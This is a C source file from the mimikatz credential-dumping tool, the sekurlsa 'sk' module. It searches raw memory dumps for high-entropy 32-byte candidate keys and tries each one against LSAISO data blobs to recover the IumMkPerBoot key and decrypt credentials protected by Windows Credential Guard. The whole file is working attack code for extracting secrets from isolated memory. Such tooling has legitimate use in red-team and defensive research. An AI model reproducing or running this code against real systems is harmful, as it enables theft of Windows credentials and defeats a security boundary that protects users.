/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_sekurlsa_sk.h"

LIST_ENTRY gCandidateKeys = {&gCandidateKeys, &gCandidateKeys};
BYTE gIumMkPerBoot[32];
BOOL isgIumMkPerBoot = FALSE;

BOOL kuhl_m_sekurlsa_sk_candidatekey_add(BYTE key[32], DOUBLE entropy)
{
	BOOL status = FALSE;
	PKEYLIST_ENTRY entry;
	if(key)
	{
		if(entry = (PKEYLIST_ENTRY) LocalAlloc(LPTR, sizeof(KEYLIST_ENTRY)))
		{
			RtlCopyMemory(entry->key, key, 32);
			entry->entropy = entropy;
			entry->navigator.Blink = gCandidateKeys.Blink;
			entry->navigator.Flink = &gCandidateKeys;
			((PKEYLIST_ENTRY) gCandidateKeys.Blink)->navigator.Flink = (PLIST_ENTRY) entry;
			gCandidateKeys.Blink = (PLIST_ENTRY) entry;
			status = TRUE;
		}
	}
	else PRINT_ERROR(L"No key?");
	return status;
}

void kuhl_m_sekurlsa_sk_candidatekey_delete(PKEYLIST_ENTRY entry)
{
	if(entry)
	{
		((PKEYLIST_ENTRY) entry->navigator.Blink)->navigator.Flink = entry->navigator.Flink;
		((PKEYLIST_ENTRY) entry->navigator.Flink)->navigator.Blink = entry->navigator.Blink;
		LocalFree(entry);
	}
}

void kuhl_m_sekurlsa_sk_candidatekey_descr(PKEYLIST_ENTRY entry)
{
	if(entry)
	{
		kprintf(L"  ");
		kull_m_string_wprintf_hex(entry->key, 32, 0);
		kprintf(L" (%f)\n", entry->entropy);
	}
}

void kuhl_m_sekurlsa_sk_candidatekeys_delete()
{
	PKEYLIST_ENTRY tmp, entry;
	for(entry = (PKEYLIST_ENTRY) gCandidateKeys.Flink; entry != (PKEYLIST_ENTRY) &gCandidateKeys; entry = tmp)
	{
		tmp = (PKEYLIST_ENTRY) entry->navigator.Flink;
		kuhl_m_sekurlsa_sk_candidatekey_delete(entry);
	}
}

void kuhl_m_sekurlsa_sk_candidatekeys_descr()
{
	PKEYLIST_ENTRY entry;
	for(entry = (PKEYLIST_ENTRY) gCandidateKeys.Flink; entry != (PKEYLIST_ENTRY) &gCandidateKeys; entry = (PKEYLIST_ENTRY) entry->navigator.Flink)
		kuhl_m_sekurlsa_sk_candidatekey_descr(entry);
}

extern double  __cdecl log(__in double _X);
DOUBLE normalizedEntropy(LPCBYTE data, DWORD len)
{
	DOUBLE ret = 0.0, p;
	DWORD i, hist[256] = {0};
	for (i = 0; i < len; i++)
		hist[data[i]]++;
	for(i = 0; i < ARRAYSIZE(hist); i++)
	{
		if(hist[i])
		{
			p = (DOUBLE) hist[i] / (DOUBLE) len;
			ret += p * log(p);
		}
	}
	return (ret == 0.0) ? 0.0 : (-ret / log(256.));
}

DWORD kuhl_m_sekurlsa_sk_search(PBYTE data, DWORD size, BOOL light)
{
	PBYTE ptr;
	DOUBLE e;
	DWORD c = 0;

	for(ptr = data; size > 0x40; ptr += 0x10, size -= 0x10)
	{
		if(	(!*(PULONGLONG) ptr + 0x00) &&
			(*(PULONGLONG) (ptr + 0x08) & 0x00ffffffffffffff) &&
			(*(PUSHORT) (ptr + 0x0e) == 0x1000) &&
			(!*(PULONGLONG) ptr + 0x30) &&
			(*(PULONGLONG) (ptr + 0x38) & 0x00ffffffffffffff) &&
			((*(PUSHORT) (ptr + 0x0e) == 0x1000) || (*(PUSHORT) (ptr + 0x0e) == 0x0800)) &&
			(light || ((ptr[0x09] == ptr[0x0d]) && (ptr[0x09] == ptr[0x39]) && (ptr[0x09] == ptr[0x3d])))	)
		{
			e = normalizedEntropy(ptr + 0x10, 0x20);
			if(e > 0.59)
			{
				kuhl_m_sekurlsa_sk_candidatekey_add(ptr + 0x10, e);
				c++;
			}
		}
	}
	return c;
}

#define KUHL_M_SEKURLSA_SK_SEARCH_FILE_CUTME (256 * 1024 * 1024)
DWORD kuhl_m_sekurlsa_sk_search_file(LPCWSTR filename)
{
	DWORD c = 0, dwBytesReaded;
	LARGE_INTEGER i, fileSize, toRead;
	HANDLE hFile;
	PBYTE buffer;
	if((hFile = CreateFile(filename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE , NULL, OPEN_EXISTING, 0, NULL)) && hFile != INVALID_HANDLE_VALUE)
	{
		if(GetFileSizeEx(hFile, &fileSize))
		{
			if(buffer = (PBYTE) LocalAlloc(LPTR, KUHL_M_SEKURLSA_SK_SEARCH_FILE_CUTME))
			{
				for(i.QuadPart = 0; i.QuadPart < fileSize.QuadPart; i.QuadPart += KUHL_M_SEKURLSA_SK_SEARCH_FILE_CUTME)
				{
					toRead.QuadPart = ((i.QuadPart + KUHL_M_SEKURLSA_SK_SEARCH_FILE_CUTME) < fileSize.QuadPart) ? KUHL_M_SEKURLSA_SK_SEARCH_FILE_CUTME : (fileSize.QuadPart - i.QuadPart);
					if(SetFilePointerEx(hFile, i, NULL, FILE_BEGIN))
					{
						if(ReadFile(hFile, buffer, toRead.LowPart, &dwBytesReaded, NULL))
							c += kuhl_m_sekurlsa_sk_search(buffer, dwBytesReaded, TRUE);
						else PRINT_ERROR_AUTO(L"ReadFile");
					}
					else PRINT_ERROR_AUTO(L"SetFilePointerEx");
				}
				LocalFree(buffer);
			}
		}
		else PRINT_ERROR_AUTO(L"GetFileSizeEx");
		CloseHandle(hFile);
	}
	else PRINT_ERROR_AUTO(L"CreateFile");
	return c;
}

NTSTATUS kuhl_m_sekurlsa_sk_bootKey(int argc, wchar_t* argv[])
{
	LPCWSTR szKey;
	BOOL showCache = TRUE;
	DWORD c;

	if (kull_m_string_args_byName(argc, argv, L"flush", NULL, NULL))
	{
		kprintf(L"!!! FLUSH cache !!!\n");
		kuhl_m_sekurlsa_sk_candidatekeys_delete();
		kprintf(L"!!! Invalidating current IumMkPerBoot !!!\n");
		isgIumMkPerBoot = FALSE;
	}
	else if (kull_m_string_args_byName(argc, argv, L"new", &szKey, NULL))
	{
		if (kull_m_string_stringToHex(szKey, gIumMkPerBoot, 32))
		{
			isgIumMkPerBoot = TRUE;
			kuhl_m_sekurlsa_sk_candidatekeys_delete();
			kprintf(L"New IumMkPerBoot : ");
			kull_m_string_wprintf_hex(gIumMkPerBoot, 32, 0);
			kprintf(L"\n");
		}
	}
	else if (kull_m_string_args_byName(argc, argv, L"raw", &szKey, NULL))
	{
		kprintf(L"RAW memory search for candidate keys in \'%s\'...\n", szKey);
		c = kuhl_m_sekurlsa_sk_search_file(szKey);
		if (c)
		{
			isgIumMkPerBoot = FALSE;
			if (c > 20)
			{
				kprintf(L"  > %u results\n", c);
				showCache = FALSE;
			}
		}
	}
	if (showCache)
	{
		kprintf(L"\nCandidate keys in cache:\n");
		kuhl_m_sekurlsa_sk_candidatekeys_descr();
		kprintf(L"\n");
	}
	kprintf(L"Current IumMkPerBoot: ");
	if (isgIumMkPerBoot)
		kull_m_string_wprintf_hex(gIumMkPerBoot, sizeof(gIumMkPerBoot), 0);
	else kprintf(L"<none>");
	kprintf(L"\n");
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_sk_tryDecodeKey(LPBYTE Key, DWORD cbKey, PLSAISO_DATA_BLOB blob, PBYTE output)
{
	return SkpEncryptionWorker(Key, cbKey, blob->data + blob->typeSize, blob->szEncrypted, (UCHAR *) &blob->unk5, FIELD_OFFSET(LSAISO_DATA_BLOB, data) - FIELD_OFFSET(LSAISO_DATA_BLOB, unk5) + blob->typeSize, blob->KdfContext, sizeof(blob->KdfContext), blob->Tag, sizeof(blob->Tag), output, blob->szEncrypted, FALSE);
}

BOOL kuhl_m_sekurlsa_sk_tryDecode(PLSAISO_DATA_BLOB blob, PBYTE *output, DWORD *cbOutput)
{
	NTSTATUS ntStatus;
	PKEYLIST_ENTRY entry;
	if(!isgIumMkPerBoot)
	{
		if(gCandidateKeys.Flink != &gCandidateKeys)
		{
			if(*output = (PBYTE) LocalAlloc(LPTR, blob->szEncrypted))
			{
				*cbOutput = blob->szEncrypted;
				for(entry = (PKEYLIST_ENTRY) gCandidateKeys.Flink; entry != (PKEYLIST_ENTRY) &gCandidateKeys; entry = (PKEYLIST_ENTRY) entry->navigator.Flink)
				{
					ntStatus = kuhl_m_sekurlsa_sk_tryDecodeKey(entry->key, sizeof(entry->key), blob, *output);
					if(NT_SUCCESS(ntStatus))
					{
						RtlCopyMemory(gIumMkPerBoot, entry->key, min(sizeof(gIumMkPerBoot), sizeof(entry->key)));
						isgIumMkPerBoot = TRUE;
						kuhl_m_sekurlsa_sk_candidatekeys_delete();
						break;
					}
				}

				if(!isgIumMkPerBoot)
				{
					*output = (PBYTE) LocalFree(*output);
					*cbOutput = 0;
				}
				else
				{
					kprintf(L"\n[Found IumMkPerBoot: ");
					kull_m_string_wprintf_hex(gIumMkPerBoot, 32, 0);
					kprintf(L"]");
				}
			}
		}
	}
	else if(isgIumMkPerBoot)
	{
		if(*output = (PBYTE) LocalAlloc(LPTR, blob->szEncrypted))
		{
			*cbOutput = blob->szEncrypted;
			ntStatus = kuhl_m_sekurlsa_sk_tryDecodeKey(gIumMkPerBoot, sizeof(gIumMkPerBoot), blob, *output);
			if(!NT_SUCCESS(ntStatus))
			{
				kprintf(L"\n");
				PRINT_ERROR(L"SkpEncryptionWorker(decrypt): 0x%08x -- invalidating the key\n", ntStatus);
				isgIumMkPerBoot = FALSE;
				*output = (PBYTE) LocalFree(*output);
				*cbOutput = 0;
			}
		}
	}
	return isgIumMkPerBoot;
}